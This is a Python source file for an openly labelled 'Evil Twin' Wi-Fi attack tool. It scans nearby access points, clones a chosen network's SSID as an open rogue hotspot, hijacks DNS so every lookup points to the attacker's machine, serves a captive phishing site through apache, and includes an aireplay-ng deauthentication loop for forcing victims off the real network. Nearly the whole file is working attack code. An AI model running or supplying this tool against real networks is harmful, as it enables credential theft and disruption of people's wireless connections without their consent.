# Evil - Twin WPA attack CLI tool
from scapy.all import *
import time
import os
from threading import Thread
from scapy.layers.dot11 import Dot11Beacon, Dot11, Dot11Elt

ap_list = []
ap_to_attack = None
clients = []
client_to_attack = None
done_scanning = False


def bash(cmd):
    return os.popen(cmd).read()


def enable_monitor_mode(interface):
    bash(f"ifconfig {interface} down")
    bash(f"iw {interface} set monitor none")
    bash(f"ifconfig {interface} up")


def disable_monitor_mode(interface):
    bash(f"ifconfig {interface} down")
    bash(f"iw {interface} mode managed")
    bash(f"ifconfig {interface} up")


def change_channel(interface):
    global done_scanning
    ch = 1
    while True and not done_scanning:
        bash(f"iw {interface} channel {ch}")
        # switch channel from 1 to 14 each 0.5s
        ch = ch % 14 + 1
        time.sleep(0.5)


def callback_ap(pkt):
    # identify a new access point and add it to the list
    if pkt.haslayer(Dot11Beacon):
        bssid = pkt[Dot11].addr2
        ssid = pkt[Dot11Elt].info.decode()
        if bssid not in [ap[0] for ap in ap_list]:
            ap_list.append((bssid, ssid))
            print(f"\t[+] Found new access point: {bssid} {ssid}")


def scan_for_aps(interface):
    #  scan for nearby access points for 60 seconds
    channel_changer = Thread(target=change_channel, args=(interface,))
    channel_changer.daemon = True
    channel_changer.start()
    sniff(prn=callback_ap, iface=interface, timeout=20)
    global done_scanning
    done_scanning = True


def scan_for_clients(pkt):
    #  get all clients associated with access point
    global clients
    if pkt.haslayer(Dot11):
        if pkt.addr1 and pkt.addr2:
            if ap_to_attack[0] == pkt.addr1:
                if pkt.type in [1, 2]:  # the type I'm looking for
                    if pkt.addr2 not in clients and pkt.addr2 != '':
                        clients.append(pkt.addr2)


def setup_hostapd_conf(interface):
    #  set up hostapd.conf for an open network
    print("[*] Setting up hostapd.conf for an open network")
    with open("/etc/hostapd/hostapd.conf", "w") as f:
        f.write("interface=%s\n" % interface)
        f.write("ssid=%s\n" % ap_to_attack[1])
        f.write("driver=nl80211\n")
        f.write("hw_mode=g\n")
        f.write("channel=1\n")
        f.write("ieee80211n=1\n")
        f.write("macaddr_acl=0\n")
        f.write("auth_algs=1\n")


def setup_dnsmasq_conf(interface):
    #  set up dnsmasq.conf for DHCP server
    print("[*] Setting up dnsmasq.conf for DHCP server")
    with open("/etc/dnsmasq.conf", "w") as f:
        f.write("no-resolv\n")
        f.write("interface=%s\n" % interface)
        f.write("dhcp-range=192.168.1.2,192.168.1.150,12h\n")
        f.write("dhcp-option=3,192.168.1.1\n")  # gw
        f.write("dhcp-option=6,192.168.1.1\n")  # dns
        f.write(f"address=/#/192.168.1.1\n")
        f.write("server=8.8.8.8\n")


def setup_iptables(interface):
    #  set up iptables for access point
    bash("iptables -t nat -A POSTROUTING -o wlp2s0 -j MASQUERADE")
    bash(f"iptables -A FORWARD -i {interface} -o wlp2s0 -j ACCEPT")
    bash("sysctl net.ipv4.ip_forward=1")


def setup_ap(interface):
    #  set up access point for client to connect to using hostapd
    print("[*] Setting up access point for client to connect to")
    #  set up hostapd.conf
    setup_hostapd_conf(interface)
    bash(f"hostapd -B /etc/hostapd/hostapd.conf &")
    #  set up dnsmasq.conf
    bash(f"ifconfig {interface} up 192.168.1.1/24 netmask 255.255.255.0")
    bash("route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1")
    print("[*] Setting up dhcp server")
    setup_dnsmasq_conf(interface)
    bash(f"dnsmasq -C /etc/dnsmasq.conf")
    #  set up iptables
    print("[*] Setting up iptables")
    setup_iptables(interface)
    print("[*] Access point is up and ready")


def killall():
    #  kill all attack processes
    bash("killall hostapd")
    bash("killall dnsmasq")
    bash("service NetworkManager restart")
    bash("service wpa_supplicant restart")
    bash("echo 0 > /proc/sys/net/ipv4/ip_forward")
    bash("iptables --flush")
    bash("iptables --flush --table nat")
    bash("iptables --delete-chain")
    bash("iptables --table nat --delete-chain")
    bash("systemctl stop apache2")


def start_evil_twin(interface):
    global ap_list, clients, ap_to_attack, client_to_attack
    #  enable monitor mode
    print("[*] Enabling monitor mode")
    enable_monitor_mode(interface)

    #  scan for nearby access points
    print("[*] Scanning for nearby access points")
    scan_for_aps(interface)
    ap_list.append(("00:00:00:00:00:00", "test"))
    print(f"[*] Found {len(ap_list)} access points")

    #  prompt user for access point to attack
    print("[*] Please choose an access point to attack")
    for ap, i in zip(ap_list, range(len(ap_list))):
        print(f"\t[{i + 1}] {ap[0]} {ap[1]}")

    while True:
        i = int(input("[>] "))
        if i not in range(1, len(ap_list) + 1):
            print("[!] Please enter a valid access point")
        else:
            ap_to_attack = ap_list[i - 1]
            break

    # #  get all clients of access point and prompt user for client to attack
    # print("[*] Getting all clients of access point")
    # sniff(iface=interface, prn=scan_for_clients, timeout=10)
    # print(f"[*] Found {len(clients)} clients")
    # print("[*] Please choose a client to attack")
    # for client, i in zip(clients, range(len(clients))):
    #     print(f"\t[{i + 1}] {client}")
    #
    # while True:
    #     i = int(input("[>] "))
    #     if i not in range(1, len(clients) + 1):
    #         print("[!] Please enter a valid client")
    #     else:
    #         client_to_attack = clients[i - 1]
    #         break

    #  set up access point for client to connect to
    setup_ap(interface)

    # start deauth thread
    print("[*] Starting deauth thread")
    #setup_de_auth(interface)

    #  start apache server
    print("[*] Starting apache server")
    setup_apache_server()

    input("[*] Press enter to continue")

    # bash("service apache2 start")

    killall()


def setup_apache_server():
    #  set up apache2 configuration
    print("[*] Setting up apache2 configuration")
    with open("/etc/apache2/sites-enabled/000-default.conf", "w") as f:
        f.write("<VirtualHost *:80>\n")
        f.write("\tServerAdmin webmaster@localhost\n")
        f.write("\tDocumentRoot /var/www/html\n")
        f.write("\tErrorLog ${APACHE_LOG_DIR}/error.log\n")
        f.write("\tCustomLog ${APACHE_LOG_DIR}/access.log combined\n")
        f.write("</VirtualHost>\n")
        f.write('<Directory "/var/www/html">\n')
        f.write("\tRewriteEngine On\n")
        f.write("\tRewriteBase /\n")
        f.write("\tRewriteCond %{HTTP_HOST} ^www\\.(.*)$ [NC]\n")
        f.write("\tRewriteRule ^(.*)$ http://%1/$1 [R=301,L]\n")
        f.write("\n\tRewriteCond %{REQUEST_FILENAME} !-f\n")
        f.write("\tRewriteCond %{REQUEST_FILENAME} !-d\n")
        f.write("\tRewriteRule ^(.*)$ / [L,QSA]\n")
        f.write("</Directory>\n")
    #  set up apache server
    bash("cp -r `pwd`/website/* /var/www/html/")
    bash("a2enmod rewrite && service apache2 start")


def setup_de_auth(interface):
    global deauth_thread
    # if we dont want using this tool:
    # https://github.com/catalyst256/MyJunk/blob/master/scapy-deauth.py
    deauth_thread = threading.Thread(target=de_auth_clients, args=(interface,))
    deauth_thread.start()
    deauth_thread.join()


def de_auth_clients(interface):
    """
    aireplay is a tool that deauthenticates clients from an access point
    -0 is deauthentication
    -0 is infinite deauthentication
    -a is the access point MAC address
    -c is the number of packets to send
    """
    global ap_to_attack, client_to_attack
    de_auth_command = f"aireplay-ng -0 0 -a {ap_to_attack[0]}"
    if client_to_attack is not None:
        de_auth_command += f"-c  {client_to_attack}"
    de_auth_command += interface
    while True:
        bash(f"aireplay-ng -0 0 -a {ap_to_attack[0]} {interface} ")
        time.sleep(1)


def main():
    #  print welcome message
    print("[*] Welcome to Evil Twin WPA attack CLI tool")
    #  prompt user for interface
    print("[?] Enter the interface you want to use: ")
    for interface, i in zip(get_if_list(), range(len(get_if_list()))):
        print(f"\t[{i + 1}] {interface}")
    interface = ""
    while True:
        i = int(input("[>] "))
        if i not in range(1, len(get_if_list()) + 1):
            print("[!] Please enter a valid interface")
        else:
            interface = get_if_list()[i - 1]
            break
    #  start evil twin attack
    start_evil_twin(interface)


if __name__ == "__main__":
    killall()
    time.sleep(2)
    main()
